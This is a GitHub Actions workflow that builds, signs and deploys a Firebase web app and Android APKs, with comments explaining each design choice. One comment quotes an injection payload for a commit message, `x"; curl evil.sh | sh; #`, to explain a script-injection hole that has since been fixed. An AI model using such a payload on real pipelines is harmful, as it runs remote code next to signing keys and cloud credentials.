name: Build and Deploy Web and APK

on:
  push:
    branches:
      - main

# Stops an older run when you push twice quickly. Without this, two runs can
# deploy at the same time and users get a mix of two versions.
concurrency:
  group: deploy-main
  cancel-in-progress: true

env:
  # GitHub gives every push a unique, increasing number. Every job below derives
  # the version from it independently rather than passing it between them, so
  # the jobs need no shared state to agree on what they are shipping.
  NATIVE_BUILD_ID: ${{ github.run_number }}
  # The site apps built next to the NCHP app (android/app/build.gradle
  # flavors, src/siteMode.js NATIVE_APP): name:package:APK file prefix.
  # Each one runs its site's web build (VITE_SITE=<name>) and is built only
  # once google-services.json has its package (Firebase console, Add app >
  # Android); until then it is skipped and the NCHP app ships as before.
  SITE_APPS: "emonc:com.nchp.monitoring.emonc:EmONC_APP_v ch:com.nchp.monitoring.ch:CH_Sudan_APP_v"

# =============================================================================
# The pipeline is split so one broken thing stops only what depends on it.
#
# It used to be a single job: verify, build, APK, functions, hosting, history,
# in that order. A Cloud Functions failure therefore blocked the web deploy
# even though the two share nothing — which is exactly what happened, twice,
# and left the finished web build unpublished both times.
#
#   verify ──┬── build ──┬── web_deploy ──┐
#            │           │                ├── record
#            │           └── android ─────┘
#            └── functions
#
#   functions   independent of everything after verify. It can fail all day
#               without holding up the web app.
#   build       produces dist/ once and hands it to the two jobs that need it,
#               so the web assets are not compiled twice.
#   web_deploy  publishes the site. Does not wait for the APK.
#   android     builds and uploads the APK. Does not block the site.
#   record      writes the release history and prunes old APKs, so it waits for
#               BOTH the site and the APK: it must not advertise or prune
#               against a release that is only half out.
# =============================================================================

jobs:
  # ---------------------------------------------------------------------------
  # Nothing used to run before a deploy: the only gate was whether the build
  # command exited zero, and then it published the web app and an APK to every
  # user. This job is that missing gate. It is cheap (about a minute) and
  # nothing else starts unless it passes.
  # ---------------------------------------------------------------------------
  verify:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '24'
          cache: 'npm'

      - name: Install Dependencies
        run: npm ci

      - name: Lint
        run: npm run lint

      - name: Unit tests
        run: npm test

      # The rules decide who can read participant names and phone numbers, and
      # a broken ruleset empties the app for everyone — so they are tested
      # against a real Firestore emulator whether or not this pipeline is the
      # thing that ships them.
      - name: Setup Java (for the Firestore emulator)
        uses: actions/setup-java@v4
        with:
          distribution: 'zulu'
          java-version: '17'

      - name: Firestore rules tests
        run: npx --yes firebase-tools@13 emulators:exec --only firestore --project imnci-courses-monitor-test "npx vitest run --config vitest.rules.config.js"

  # ---------------------------------------------------------------------------
  # Compiles the web assets and both manifests once. Everything downstream takes
  # the artifact, so the site the APK wraps is byte-for-byte the site deployed.
  # ---------------------------------------------------------------------------
  build:
    needs: verify
    runs-on: ubuntu-latest
    outputs:
      build_version: ${{ steps.version.outputs.build_version }}
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '24'
          cache: 'npm'

      # npm ci installs exactly what package-lock.json pins. npm install
      # re-resolved every caret range on each run, so two builds of the same
      # commit could ship different dependency code.
      - name: Install Dependencies
        run: npm ci

      - name: Set App Version
        id: version
        run: |
          RUN_ID=${{ github.run_number }}
          MAJOR=$(( (RUN_ID / 10) + 1 ))
          MINOR=$(( RUN_ID % 10 ))
          BUILD_VERSION="${MAJOR}.${MINOR}.0"
          echo "BUILD_VERSION=$BUILD_VERSION" >> $GITHUB_ENV
          echo "build_version=$BUILD_VERSION" >> $GITHUB_OUTPUT
          # The version lives in package.json, which vite.config.js reads.
          # Writing only .env does not work: vite.config.js sets
          # VITE_APP_VERSION with `define`, and define always wins over .env,
          # so the app would show package.json's old version instead.
          npm version "$BUILD_VERSION" --no-git-tag-version --allow-same-version
          # Kept as well, so any code still reading the variable directly agrees.
          echo "VITE_APP_VERSION=${BUILD_VERSION}" > .env
          echo "Building version $BUILD_VERSION, native build ${{ env.NATIVE_BUILD_ID }}"

      # A commit message containing [force-update] makes the new APK required.
      # Before, EVERY push set mandatory: true, so users were blocked by a
      # full APK download on every single release.
      #
      # COMMIT_MESSAGE goes through `env:` rather than being expanded straight
      # into the script. A `${{ }}` expression is pasted in as literal text
      # before bash sees the line, so a commit titled `x"; curl evil.sh | sh; #`
      # used to run in this job — the one holding the Android signing keystore
      # and the Firebase service account. Through env: it is only ever a value.
      - name: Decide if this native build is mandatory
        env:
          COMMIT_MESSAGE: ${{ github.event.head_commit.message }}
        run: |
          if printf '%s' "$COMMIT_MESSAGE" | grep -qi '\[force-update\]'; then
            echo "IS_MANDATORY=true" >> $GITHUB_ENV
          else
            echo "IS_MANDATORY=false" >> $GITHUB_ENV
          fi

      - name: Build Web Assets
        run: npm run build

      # Each site app's web layer: the same code built for that site
      # (EmONC: Courses and Surveys only, its own name and logo; ch: links
      # point at ch-sudan.web.app). Never published as a site; it goes into
      # that app's APK and its live updates. Apps not yet in
      # google-services.json are listed as skipped.
      - name: Build site app web layers
        run: |
          mkdir -p dist-apps
          : > site-apps-ready.txt
          for APP in $SITE_APPS; do
            IFS=: read -r NAME PKG PREFIX <<< "$APP"
            VITE_SITE=$NAME npx vite build --outDir dist-apps/$NAME
            if jq -e --arg p "$PKG" '.client[] | select(.client_info.android_client_info.package_name == $p)' android/app/google-services.json > /dev/null; then
              echo "$NAME" >> site-apps-ready.txt
            else
              echo "::warning::google-services.json has no $PKG app yet, so the $NAME APK is not built."
            fi
          done
          echo "Site apps to build: $(tr '\n' ' ' < site-apps-ready.txt)"
          cp site-apps-ready.txt dist-apps/

      # Android App Links: lets a shared link (WhatsApp, SMS, e-mail) open in
      # the installed app instead of the browser. Android checks that each site
      # names the app's signing certificate in /.well-known/assetlinks.json.
      # Hosting skips dot-folders, so the file goes to /app-links/ and
      # firebase.json serves it at /.well-known/assetlinks.json on every site.
      # Only the certificate's public fingerprint is written; the keystore is
      # read from a temp file that is deleted straight away. Secrets go through
      # env: so they are never pasted into the script text.
      - name: Write Android App Links file
        env:
          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
        run: |
          if [ -z "$KEYSTORE_BASE64" ]; then
            echo "::warning::No signing keystore, so shared links will open in the browser, not the app."
            exit 0
          fi
          KS="$RUNNER_TEMP/applinks.keystore"
          printf '%s' "$KEYSTORE_BASE64" | base64 --decode > "$KS"
          FINGERPRINT=$(keytool -list -v -keystore "$KS" -alias "$KEY_ALIAS" -storepass "$KEYSTORE_PASSWORD" 2>/dev/null \
            | grep -m1 -E '^\s*SHA256:' | sed -E 's/^\s*SHA256:\s*//' | tr -d '[:space:]')
          rm -f "$KS"
          if ! printf '%s' "$FINGERPRINT" | grep -qE '^([0-9A-F]{2}:){31}[0-9A-F]{2}$'; then
            echo "::warning::Could not read the signing certificate, so shared links will open in the browser, not the app."
            exit 0
          fi
          mkdir -p dist/app-links
          # All the apps are signed with the same key. Each claims only its own
          # site's links (android/app/src/<flavor>/AndroidManifest.xml).
          jq -n --arg fp "$FINGERPRINT" '[("com.nchp.monitoring.app", "com.nchp.monitoring.emonc", "com.nchp.monitoring.ch") | {
              relation: ["delegate_permission/common.handle_all_urls"],
              target: { namespace: "android_app", package_name: .,
                        sha256_cert_fingerprints: [$fp] } }]' \
            > dist/app-links/assetlinks.json
          cat dist/app-links/assetlinks.json

      - name: Create Web Update Manifests
        run: |
          FIREBASE_URL="https://imnci-courses-monitor.web.app"
          ZIP_NAME="update-${{ env.BUILD_VERSION }}.zip"
          cd dist
          zip -r ../${ZIP_NAME} .
          cd ..
          # Capgo checks this against the file it downloads. Without it, a
          # half-downloaded or corrupted zip is installed and the app then
          # fails to start, so Capgo restores the previous version.
          CHECKSUM=$(sha256sum ${ZIP_NAME} | cut -d ' ' -f1)
          mkdir -p dist/latest
          mv ${ZIP_NAME} dist/latest/
          # Built with jq rather than a heredoc. The old version interpolated the
          # commit message into an unquoted <<EOF, which runs command
          # substitution — a commit titled `x$(...)` executed here, next to the
          # signing keystore. It also produced invalid JSON the moment a commit
          # message contained a double quote, which would have left every device
          # unable to parse the manifest.
          # `notes` is deliberately empty. It used to carry $COMMIT_MESSAGE,
          # which put the whole release description into the update dialog on
          # the phone; the dialog only asks whether to restart now or later.
          jq -n \
            --arg version "$BUILD_VERSION" \
            --arg url "${FIREBASE_URL}/latest/${ZIP_NAME}" \
            --arg checksum "$CHECKSUM" \
            '{version: $version, url: $url, checksum: $checksum,
              mandatory: false, notes: "", minNativeBuild: 1}' \
            > dist/latest/update.json
          cat dist/latest/update.json

          # Each site app's live updates: its web layer, at /latest-<name>/
          # (android/app/src/<name>/res/values/strings.xml, src/siteMode.js).
          for APP in $SITE_APPS; do
            IFS=: read -r NAME PKG PREFIX <<< "$APP"
            APP_ZIP="update-${NAME}-${{ env.BUILD_VERSION }}.zip"
            (cd dist-apps/$NAME && zip -qr ../../${APP_ZIP} .)
            mkdir -p dist/latest-$NAME
            mv ${APP_ZIP} dist/latest-$NAME/
            jq -n \
              --arg version "$BUILD_VERSION" \
              --arg url "${FIREBASE_URL}/latest-${NAME}/${APP_ZIP}" \
              --arg checksum "$(sha256sum dist/latest-$NAME/${APP_ZIP} | cut -d ' ' -f1)" \
              '{version: $version, url: $url, checksum: $checksum,
                mandatory: false, notes: "", minNativeBuild: 1}' \
              > dist/latest-$NAME/update.json
            cat dist/latest-$NAME/update.json
          done

      # The APK URL is built from the version, not from the upload result, so
      # this manifest can be written before the APK exists. AdminDashboard.jsx
      # fetches it to show which native build is current.
      - name: Create Native JSON Manifest
        run: |
          mkdir -p public
          STORAGE_URL="https://firebasestorage.googleapis.com/v0/b/imnci-courses-monitor.firebasestorage.app/o/apks%2FNational_Child_Health_Program_APP_v${{ env.BUILD_VERSION }}.apk?alt=media"
          # The app reads `apkUrl` from Firestore (meta/update_config), which
          # scripts/push-update.js maintains. Both names are written here for
          # the admin screen, which reads this file directly.
          jq -n \
            --argjson latestNativeBuild ${{ env.NATIVE_BUILD_ID }} \
            --arg versionString "${{ env.BUILD_VERSION }}" \
            --arg url "$STORAGE_URL" \
            --argjson mandatory ${{ env.IS_MANDATORY }} \
            '{latestNativeBuild: $latestNativeBuild, versionString: $versionString,
              apkUrl: $url, downloadUrl: $url, mandatory: $mandatory,
              message: ("New version " + $versionString + " is available."),
              releaseNotes: ("Automated deployment for v" + $versionString)}' \
            > public/native-version.json
          cp public/native-version.json dist/native-version.json
          cat public/native-version.json
          # Each site's "Get the app" button reads native-version-<name>.json
          # (GetAppBanner.jsx). Written only for the apps built this release.
          for APP in $SITE_APPS; do
            IFS=: read -r NAME PKG PREFIX <<< "$APP"
            grep -qx "$NAME" site-apps-ready.txt || continue
            jq --arg url "${STORAGE_URL//National_Child_Health_Program_APP_v/$PREFIX}" \
              '.apkUrl = $url | .downloadUrl = $url' public/native-version.json > dist/native-version-$NAME.json
            cat dist/native-version-$NAME.json
          done

      - name: Upload web build
        uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist
          retention-days: 3

      - name: Upload site app web layers
        uses: actions/upload-artifact@v4
        with:
          name: dist-apps
          path: dist-apps
          retention-days: 3

  # ---------------------------------------------------------------------------
  # Publishes the site. Needs only the build — not the APK, and not functions.
  # ---------------------------------------------------------------------------
  web_deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Download web build
        uses: actions/download-artifact@v4
        with:
          name: dist
          path: dist

      # KEEP THE PREVIOUS RELEASES' FILES ON THE SITE.
      # Every release renames the code files. A phone that still has the app
      # open is running the previous release, and the next screen it opens asks
      # for a file name that the deploy has just removed — that failure is what
      # made the app hang and then reload itself after each update. The files of
      # the last week of releases are now published alongside the new ones,
      # so an open app carries on and simply starts on the new release the next
      # time it is opened. Only the web site gets them: the APK and the
      # over-the-air zip were made from dist/ before this step.
      - name: Restore earlier releases' files
        uses: actions/cache/restore@v4
        with:
          path: previous-assets
          key: web-assets-${{ github.run_id }}
          restore-keys: web-assets-

      - name: Add earlier releases' files to this deploy
        run: |
          mkdir -p previous-assets
          # Older than 7 days: no open app can still need them. (It was 14,
          # but with several releases a day those old files made every
          # Hosting version much bigger, see the storage note below.)
          find previous-assets -type f -mtime +7 -delete
          KEPT=$(find previous-assets -type f | wc -l)
          # -n: never replace a file of this release.
          cp -rp --update=none previous-assets/. dist/assets/
          echo "Kept ${KEPT} file(s) from earlier releases."
          # What the next deploy keeps: everything served now, with dates kept.
          rm -rf previous-assets
          cp -rp dist/assets previous-assets

      # No `target`, so this publishes every site listed in firebase.json from
      # the same dist/: imnci-courses-monitor, ch-sudan and emonc-sudan. The
      # EmONC site picks its Courses-only mode from its address (src/siteMode.js).
      - name: Deploy to Firebase Hosting
        uses: FirebaseExtended/action-hosting-deploy@v0
        with:
          firebaseServiceAccount: "${{ secrets.FIREBASE_SERVICE_ACCOUNT_IMNCI_COURSES_MONITOR }}"
          channelId: live
          projectId: "imnci-courses-monitor"

      # HOSTING STORAGE. Firebase keeps every deployed version of every site
      # until told otherwise, and the no-cost quota is 10 GB for the whole
      # project. Each release adds about 20 MB of web files plus the
      # over-the-air zips to each of the three sites, so a busy week of pushes
      # went past 10 GB. maxVersions makes Firebase delete versions older
      # than the newest 5 on each site by itself (the live one is never
      # deleted); rolling back is still possible to any of those 5.
      # A warning, not a failure: the site is already live.
      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@v2
        with:
          credentials_json: '${{ secrets.FIREBASE_SERVICE_ACCOUNT_IMNCI_COURSES_MONITOR }}'

      - name: Setup Google Cloud SDK
        uses: google-github-actions/setup-gcloud@v2

      - name: Keep only the newest Hosting versions
        env:
          KEEP_VERSIONS: 5
        run: |
          TOKEN=$(gcloud auth print-access-token)
          for SITE in imnci-courses-monitor ch-sudan emonc-sudan; do
            if curl -fsS -X PATCH \
                -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
                -d "{\"maxVersions\": $KEEP_VERSIONS}" \
                "https://firebasehosting.googleapis.com/v1beta1/sites/$SITE/config?updateMask=maxVersions"; then
              echo " <- $SITE keeps its newest $KEEP_VERSIONS versions."
            else
              echo "::warning::Could not set the version limit on $SITE. Set it in Firebase console > Hosting > $SITE > Release history > Settings."
            fi
          done

      # Saved only after a successful deploy, for the next release to keep.
      - name: Save this release's files for the next deploy
        uses: actions/cache/save@v4
        with:
          path: previous-assets
          key: web-assets-${{ github.run_id }}

      # Confirms the update file is really live before anything tells devices
      # about it.
      - name: Verify update.json is live
        run: |
          for i in 1 2 3 4 5; do
            LIVE=$(curl -fsSL "https://imnci-courses-monitor.web.app/latest/update.json?t=$(date +%s)" || echo "")
            echo "$LIVE"
            if echo "$LIVE" | grep -q "${{ needs.build.outputs.build_version }}"; then
              echo "update.json is live."
              exit 0
            fi
            echo "Not live yet, waiting..."
            sleep 15
          done
          echo "::error::update.json did not show the new version. Check the Cache-Control headers in firebase.json."
          exit 1

      # The two extra sites only need to answer. A warning, not a failure: the
      # main site is already live at this point and must not be held back.
      - name: Check the extra sites
        run: |
          for SITE in ch-sudan emonc-sudan; do
            if curl -fsSL "https://${SITE}.web.app/latest/update.json?t=$(date +%s)" | grep -q "${{ needs.build.outputs.build_version }}"; then
              echo "${SITE} is live."
            else
              echo "::warning::${SITE}.web.app did not show the new version."
            fi
          done

      # Each app checks its own manifest from inside the phone (origin
      # https://localhost), so the browser rules apply: without an
      # Access-Control-Allow-Origin header the check fails with "Failed to
      # fetch" and the app never updates. That is what happened to the EmONC
      # and CH Sudan apps when firebase.json only covered /latest/.
      - name: Check the site apps' update files can be read by the apps
        run: |
          for P in latest/update.json latest-emonc/update.json latest-ch/update.json native-version.json native-version-emonc.json native-version-ch.json; do
            H=$(curl -fsS -D - -o /dev/null -H "Origin: https://localhost" "https://imnci-courses-monitor.web.app/$P?t=$(date +%s)" || echo "")
            if printf '%s' "$H" | grep -qi '^access-control-allow-origin: \*'; then
              echo "$P: OK"
            else
              echo "::warning::$P cannot be read by the app (no CORS header or missing). Check firebase.json."
            fi
          done

  # ---------------------------------------------------------------------------
  # Cloud Functions. Independent of the web app on purpose: the two have failed
  # for unrelated reasons (an IAM grant, then a missing npm install, then an
  # extensions API permission) and each time the site was held hostage by it.
  # ---------------------------------------------------------------------------
  functions:
    needs: verify
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      # Matches the deployed runtime (firebase.json) rather than the version the
      # web build uses, so what npm installs here is what the functions will
      # actually run on.
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'npm'

      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@v2
        with:
          credentials_json: '${{ secrets.FIREBASE_SERVICE_ACCOUNT_IMNCI_COURSES_MONITOR }}'

      - name: Setup Google Cloud SDK
        uses: google-github-actions/setup-gcloud@v2

      # Asks Google which of the permissions a deploy needs the CI account
      # actually holds, and prints the exact grant commands for the ones it does
      # not. Runs in seconds, before anything is built.
      - name: Check deploy permissions
        run: bash scripts/preflight-deploy-iam.sh imnci-courses-monitor

      # The root npm ci installs the app's dependencies, not the functions'.
      # functions/ is a separate package with its own lockfile, and without this
      # the deploy fails with "Cannot find module 'firebase-functions/v2/https'"
      # — the CLI parses index.js in place to discover the triggers, so the
      # packages have to be on disk first.
      - name: Install Cloud Functions dependencies
        working-directory: functions
        run: npm ci

      # SECURITY RULES ARE NOT DEPLOYED HERE, on purpose. A rules mistake takes
      # the whole app down for everyone at once, and the failure looks like
      # "this screen is empty" rather than an error anyone can act on. They go
      # out as a separate, deliberate step:
      #
      #     npm run test:rules && npm run deploy:rules
      - name: Deploy Cloud Functions
        run: |
          npx --yes firebase-tools@13 deploy \
            --only functions \
            --project imnci-courses-monitor \
            --non-interactive \
            --force

      # The public mentorship dashboard is served from a copy the server builds
      # on its first request (functions/publicMentorshipCopy.js). Building it
      # here, right after the deploy, means no visitor waits for that first
      # build: they get the saved copy in seconds. Never fails the deploy.
      - name: Build the public mentorship dashboard copy
        continue-on-error: true
        run: |
          curl -sS -o /dev/null -w "publicMentorshipCopy: HTTP %{http_code} in %{time_total}s\n" \
            -X POST -H "Content-Type: application/json" -d '{"data":{}}' --max-time 320 \
            https://us-central1-imnci-courses-monitor.cloudfunctions.net/publicMentorshipCopy || true

  # ---------------------------------------------------------------------------
  # The APK. Wraps the same dist/ the site was built from, so the two cannot
  # drift apart within a release.
  # ---------------------------------------------------------------------------
  android:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '24'
          cache: 'npm'

      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: 'zulu'
          java-version: '17'
          cache: 'gradle'

      - name: Install Dependencies
        run: npm ci

      - name: Download web build
        uses: actions/download-artifact@v4
        with:
          name: dist
          path: dist

      - name: Download site app web layers
        uses: actions/download-artifact@v4
        with:
          name: dist-apps
          path: dist-apps

      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@v2
        with:
          credentials_json: '${{ secrets.FIREBASE_SERVICE_ACCOUNT_IMNCI_COURSES_MONITOR }}'

      - name: Setup Google Cloud SDK
        uses: google-github-actions/setup-gcloud@v2

      - name: Build and Sign Native APK
        env:
          BUILD_VERSION: ${{ needs.build.outputs.build_version }}
        run: |
          # The old script ended these two lines with "|| true", so a failed
          # replacement was hidden and the APK kept the previous versionCode.
          # Android then refuses to install it as an update.
          sed -i -e "s/versionCode [0-9]*/versionCode ${{ env.NATIVE_BUILD_ID }}/g" android/app/build.gradle
          sed -i -e "s/versionName \".*\"/versionName \"${BUILD_VERSION}\"/g" android/app/build.gradle
          grep -E "versionCode|versionName" android/app/build.gradle
          npx cap sync android
          # Fails the build early if a plugin is in package.json but missing
          # from the Android project. This is how push notifications ended up
          # not working: the plugin was installed but never synced.
          grep -q "capacitor-push-notifications" android/capacitor.settings.gradle \
            || { echo "::error::push-notifications plugin missing from the Android project"; exit 1; }
          grep -q "capgo-capacitor-updater" android/capacitor.settings.gradle \
            || { echo "::error::capgo updater plugin missing from the Android project"; exit 1; }
          echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > android/app/nchp-release.keystore
          cd android
          chmod +x gradlew
          BUILD_TOOLS_DIR=$(ls -d ${ANDROID_HOME}/build-tools/* | sort -V | tail -1)
          echo "Using build tools: $BUILD_TOOLS_DIR"
          # Aligns and signs one app's APK (android/app/build.gradle flavors).
          sign_apk() {
            local OUT=app/build/outputs/apk/$1/release
            $BUILD_TOOLS_DIR/zipalign -v -p 4 $OUT/app-$1-release-unsigned.apk $OUT/app-$1-release-aligned.apk > /dev/null
            $BUILD_TOOLS_DIR/apksigner sign --ks app/nchp-release.keystore \
              --ks-key-alias "${{ secrets.KEY_ALIAS }}" \
              --ks-pass "pass:${{ secrets.KEYSTORE_PASSWORD }}" \
              --key-pass "pass:${{ secrets.KEY_PASSWORD }}" \
              $OUT/app-$1-release-aligned.apk
            # Proves the signature is valid before anyone downloads it.
            $BUILD_TOOLS_DIR/apksigner verify --verbose $OUT/app-$1-release-aligned.apk
          }
          # The NCHP app, with the main web build that cap sync copied in.
          ./gradlew assembleNchpRelease
          sign_apk nchp
          # The site apps: same project, each with its site's web layer.
          for NAME in $(cat ../dist-apps/site-apps-ready.txt); do
            rm -rf app/src/main/assets/public
            cp -r ../dist-apps/$NAME app/src/main/assets/public
            ./gradlew assemble${NAME^}Release
            sign_apk $NAME
          done
          # The keystore must never stay on disk after signing.
          rm -f app/nchp-release.keystore
          cd ..

      - name: Upload APK to Firebase Cloud Storage
        env:
          BUILD_VERSION: ${{ needs.build.outputs.build_version }}
        run: |
          gcloud storage cp \
            android/app/build/outputs/apk/nchp/release/app-nchp-release-aligned.apk \
            gs://imnci-courses-monitor.firebasestorage.app/apks/National_Child_Health_Program_APP_v${BUILD_VERSION}.apk \
            --cache-control="public, max-age=31536000, immutable"
          # Same version, each app's file name (src/siteMode.js siteApkUrl).
          for APP in $SITE_APPS; do
            IFS=: read -r NAME PKG PREFIX <<< "$APP"
            grep -qx "$NAME" dist-apps/site-apps-ready.txt || continue
            gcloud storage cp \
              android/app/build/outputs/apk/$NAME/release/app-$NAME-release-aligned.apk \
              gs://imnci-courses-monitor.firebasestorage.app/apks/${PREFIX}${BUILD_VERSION}.apk \
              --cache-control="public, max-age=31536000, immutable"
          done

  # ---------------------------------------------------------------------------
  # Release history and old-APK cleanup. Waits for BOTH the site and the APK:
  # push-update.js prunes APKs relative to the live build, so running it while
  # half the release is out could delete a build users still depend on.
  # ---------------------------------------------------------------------------
  record:
    needs: [build, web_deploy, android]
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '24'
          cache: 'npm'

      - name: Install Dependencies
        run: npm ci

      - name: Download web build
        uses: actions/download-artifact@v4
        with:
          name: dist
          path: dist

      # push-update.js reads public/native-version.json, and a checked-out
      # public/native-version.json is the STALE copy committed to the repo — it
      # still says v1.1.0, build 2. In the old single job the generate step had
      # already overwritten it in the same workspace; this job is a fresh
      # checkout, so it has to take the generated manifest from the build
      # artifact instead. Without this the release history would name an APK
      # that was never built, and the cleanup would prune against build 2.
      - name: Restore the generated native manifest
        run: |
          mkdir -p public
          cp dist/native-version.json public/native-version.json
          # Belt and braces: refuse to record a release the build did not make.
          EXPECTED="${{ needs.build.outputs.build_version }}"
          ACTUAL=$(jq -r '.versionString' public/native-version.json)
          if [ "$ACTUAL" != "$EXPECTED" ]; then
            echo "::error::native-version.json says $ACTUAL but this run built $EXPECTED."
            exit 1
          fi
          cat public/native-version.json

      - name: Push Update History and Cleanup Old APKs
        env:
          FIREBASE_SERVICE_ACCOUNT: ${{ secrets.FIREBASE_SERVICE_ACCOUNT_IMNCI_COURSES_MONITOR }}
        run: node scripts/push-update.js
